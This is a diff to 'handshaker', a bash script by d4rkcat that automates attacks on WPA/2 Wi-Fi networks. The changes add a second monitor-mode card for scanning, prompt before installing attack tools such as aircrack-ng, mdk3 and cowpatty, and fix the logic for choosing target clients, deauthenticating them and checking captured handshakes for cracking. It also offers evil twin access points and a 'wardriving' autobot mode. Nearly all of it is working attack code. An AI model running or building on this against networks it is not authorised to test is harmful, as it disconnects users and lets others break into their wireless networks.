@@ -22,7 +22,7 @@ handshaker - Detect, deauth, capture and crack WPA/2 handshakes. d4rkcat <rfarag
 	Usage: 	handshaker <Method> <Options>
 	
 	Method:
-		-a - Autobot or Wardriving mode
+		-a - Autobot or wardriving mode
 		-e - Search for AP by partial unique ESSID
 		-l - Scan for APs and present a target list
 		-c - Crack handshake from pcap
@@ -30,13 +30,13 @@ handshaker - Detect, deauth, capture and crack WPA/2 handshakes. d4rkcat <rfarag
 	Options:
 		-i  - Wireless Interface card
 		-i2 - Second wireless card (better capture rate)
-		-b  - Use Evil twin AP to capture handshakes
 		-w  - Wordlist to use for cracking
 		-d  - Deauth this many times for each AP (default 3)
 		-p  - Only attack clients above this power level
 		-o  - Save handshakes to custom directory
 		-g  - Use android GPS to record AP location
 		-t  - Timeout to wait for GPS at startup (default 2)
+		-b  - Use evil twin AP to capture handshakes
 		-m  - Use mdk3 for deauth (default aireplay-ng)
 		-s  - Silent
 		-h  - This help
@@ -58,37 +58,48 @@ fstart()																#Startup
 	BLU=$(echo -e "\e[1;36m")
 	GRN=$(echo -e "\e[1;32m")
 	RST=$(echo -e "\e[0;0;0m")
-	LIST="""beep
+	LIST="""aircrack-ng
+beep
 bc
 mdk3
 gpsd 
 cowpatty
-pyrit"""	
+pyrit"
 	for COMMAND in $LIST
 		do
 			if [ $(which $COMMAND) -z ] 2> /dev/null
 				then
-					echo $RED" [*] $COMMAND not found, Installing..."
-					if [ $(whoami) = "root" ]
+					echo $RED" [>] $COMMAND not found, install now? [Y/n]"
+					read -p "  >"$GRN DOINST
+					case $DOINST in
+					"")INST=1;;
+					"Y")INST=1;;
+					"y")INST=1
+					esac
+					if [ $INST = 1 ] 2> /dev/null
 						then
-							apt-get install $COMMAND
-							if [ $(which $COMMAND) -z ] 2> /dev/null
+							if [ $(whoami) = "root" ]
 								then
-									echo " [*] ERROR: $COMMAND could not be installed, please install manually"
+									apt-get install $COMMAND
+									if [ $(which $COMMAND) -z ] 2> /dev/null
+										then
+											echo $RED" [*] ERROR: $COMMAND could not be installed, please install manually"
+										else
+											echo " [*] $COMMAND Installed"
+									fi
 								else
-									echo $GRN" [*] $COMMAND Installed"
-							fi
-						else
-							sudo apt-get install $COMMAND
-							if [ $(which $COMMAND) -z ] 2> /dev/null
-								then
-									echo " [*] ERROR: $COMMAND could not be installed, please install manually"
-									sleep 0.4
-								else
-									echo $GRN" [*] $COMMAND Installed"
+									sudo apt-get install $COMMAND
+									if [ $(which $COMMAND) -z ] 2> /dev/null
+										then
+											echo $RED" [*] ERROR: $COMMAND could not be installed, please install manually"
+											sleep 0.4
+										else
+											echo " [*] $COMMAND Installed"
+									fi
 							fi
 					fi
 			fi
+			INST=""
 		done
 	clear
 	if [ $CRACK = "1" ] 2> /dev/null
@@ -166,11 +177,16 @@ pyrit"""
 				done
 			echo $BLU
 			read -p "  > wlan" NIC
-			NIC="wlan"$NIC
+			if [ ${NIC:0:4} = 'wlan' ] 2> /dev/null
+				then
+					A=1
+				else
+					NIC="wlan"$NIC
+			fi
 			echo
 			echo $GRN;MON1=$(airmon-ng start $NIC | grep monitor | cut -d ' ' -f 5 | head -c -2);echo " [*] Started $NIC monitor on $MON1"
 		else
-			echo $GRN;MON1=$(airmon-ng start $NIC | grep monitor | cut -d ' ' -f 5 | head -c -2);echo " [*] Started $NIC monitor on $MON1"
+			echo $GRN;MON1=$(airmon-ng start $NIC 1 | grep monitor | cut -d ' ' -f 5 | head -c -2);echo " [*] Started $NIC monitor on $MON1"
 	fi
 	if [ $(ifconfig | grep $MON1) -z ] 2> /dev/null
 		then
@@ -181,7 +197,7 @@ pyrit"""
 		then
 			A=1
 		else
-			echo $GRN;MON2=$(airmon-ng start $NIC2 | grep monitor | cut -d ' ' -f 5 | head -c -2);echo " [*] Started $NIC2 monitor on $MON2"
+			echo $GRN;MON2=$(airmon-ng start $NIC2 6 | grep monitor | cut -d ' ' -f 5 | head -c -2);echo " [*] Started $NIC2 monitor on $MON2"
 			if [ $(ifconfig | grep $MON2) -z ] 2> /dev/null
 				then
 					echo $RED;$COLOR 1;$COLOR2 9;echo " [*] ERROR: $NIC2 card could not be started! "$RST
@@ -282,14 +298,29 @@ fapscan()																#Grep for AP ESSID
 
 flistap()																#List all APs
 {
-	gnome-terminal -t 'Scanning...' --geometry=100x20+0+320 -x airodump-ng $MON1 -a -w $HOME/tmp -o csv --encrypt WPA&
+	if [ $NIC2 -z ] 2> /dev/null
+		then
+			gnome-terminal -t 'Scanning...' --geometry=100x20+0+320 -x airodump-ng $MON1 -a -w $HOME/tmp -o csv --encrypt WPA&
+		else
+			gnome-terminal -t 'Scanning...' --geometry=100x20+0+200 -x airodump-ng $MON1 -a -w $HOME/tmp -o csv --encrypt WPA&
+			gnome-terminal -t 'Scanning...' --geometry=100x20+0+600 -x airodump-ng $MON2 -a -w $HOME/tmpe -o csv --encrypt WPA&
+	fi
 	clear
 	echo $BLU" [*] Scanning for$GRN All APs$BLU, Please wait.. "$RED
 	sleep 10
 	killall airodump-ng
-	echo "$(cat $HOME/tmp-01.csv | grep WPA | cut -d ',' -f 14)" > $HOME/tmp2
+	if [ $NIC2 -z ] 2> /dev/null
+		then
+			echo "$(cat $HOME/tmp-01.csv | grep WPA | cut -d ',' -f 14)" > $HOME/tmp2
+		else
+			echo "$(cat $HOME/tmp-01.csv | grep WPA | cut -d ',' -f 14)" > $HOME/tmp2
+			echo "$(cat $HOME/tmpe-01.csv | grep WPA | cut -d ',' -f 14)" >> $HOME/tmp2
+			UNIQ=$(cat $HOME/tmp2 | sort -u)
+			echo "$UNIQ" > $HOME/tmp2
+	fi
 	LNUM=$(cat $HOME/tmp2 | wc -l)
-	$COLOR 4;echo " [*] $LNUM APs found:"$GRN;$COLOR 9
+	clear
+	echo $BLU" [*] $RED$LNUM$BLU APs found:"$GRN
 	LNUM=0
 	while read AP
 		do
@@ -297,13 +328,19 @@ flistap()																#List all APs
 			echo " [$LNUM] $AP"
 		done < $HOME/tmp2
 
-	echo $BLU" [>] Please choose an$GRN AP"
+	echo $BLU" [>] Please choose an AP"
 	read -p "  >" AP
 	echo $RST
+	if [ $NIC2 -z ] 2> /dev/null
+		then
+			FCAT=$(cat $HOME/tmp-01.csv)
+		else
+			FCAT=$(cat $HOME/tmp-01.csv $HOME/tmpe-01.csv)
+	fi
 	ESSID=$(cat $HOME/tmp2 | sed -n "$AP"p)
 	ESSID=${ESSID:1}
-	BSSID=$(cat $HOME/tmp-01.csv | grep WPA | grep "$ESSID" | cut -d ',' -f 1)
-	CHAN=$(cat $HOME/tmp-01.csv | grep WPA | grep "$ESSID" | cut -d ',' -f 4)
+	BSSID=$(echo "$FCAT" | grep WPA | grep "$ESSID" | cut -d ',' -f 1 | head -n 1)
+	CHAN=$(echo "$FCAT" | grep WPA | grep "$ESSID" | cut -d ',' -f 4 | head -n 1)
 	CHAN=$((CHAN + 1 - 1))
 	fclientscan
 }
@@ -501,22 +538,22 @@ fautobot()																#Automagically find new target clients
 				else
 					CLIENT=$(echo "$FCAT" | grep Station -A 7 | grep "$BSSID" | cut -d ',' -f 1 | sed '/^$/d' | head -n 1)
 			fi
-			SDONE=1
 			if [ $CLIENT -z ] 2> /dev/null
 				then
 					SDONE=""
 				else
+					SDONE=1
 					POWER=$(echo "$FCAT" | grep "$CLIENT" | cut -d ',' -f 4 | head -n 1)
 					POWER=${POWER:2}
 					ESSID=$(echo "$FCAT" | grep "$BSSID" | cut -d ',' -f 14 | sed '/^$/d' | head -n 1)
 					ESSID=${ESSID:1}
-			fi
-			if [ $POWER -z ] 2> /dev/null
-				then
-					SDONE=""
-			elif [ $ESSID -z ] 2> /dev/null
-				then
-					SDONE=""
+					if [ $POWER -z ] 2> /dev/null
+						then
+							SDONE=""
+					elif [ $ESSID -z ] 2> /dev/null
+						then
+							SDONE=""
+					fi
 			fi
 			if [ $SDONE = 1 ] 2> /dev/null
 				then
@@ -888,7 +925,7 @@ fanalyze()																#Analyze pcap for handshakes
 		then
 			ANALYZE=$(cowpatty -r $HOME/tmp-01.cap -c)
 		else
-			ANALYZE='fh348hf'
+			ANALYZE='fff'
 	fi
 	if [ $NIC2 -z ] 2> /dev/null
 		then
@@ -898,7 +935,7 @@ fanalyze()																#Analyze pcap for handshakes
 				then
 					ANALYZE2=$(cowpatty -r $HOME/tmpe-01.cap -c)
 				else
-					ANALYZE2='fh348hf'
+					ANALYZE2='fff'
 			fi
 			if  [ $(echo "$ANALYZE2" | grep Collected) -z ] 2> /dev/null
 				then
@@ -910,7 +947,7 @@ fanalyze()																#Analyze pcap for handshakes
 	fi
 	if  [ $(echo "$ANALYZE" | grep Collected) -z ] 2> /dev/null
 		then
-			A=2
+			A=1
 		else 
 			GDONE=1
 	fi
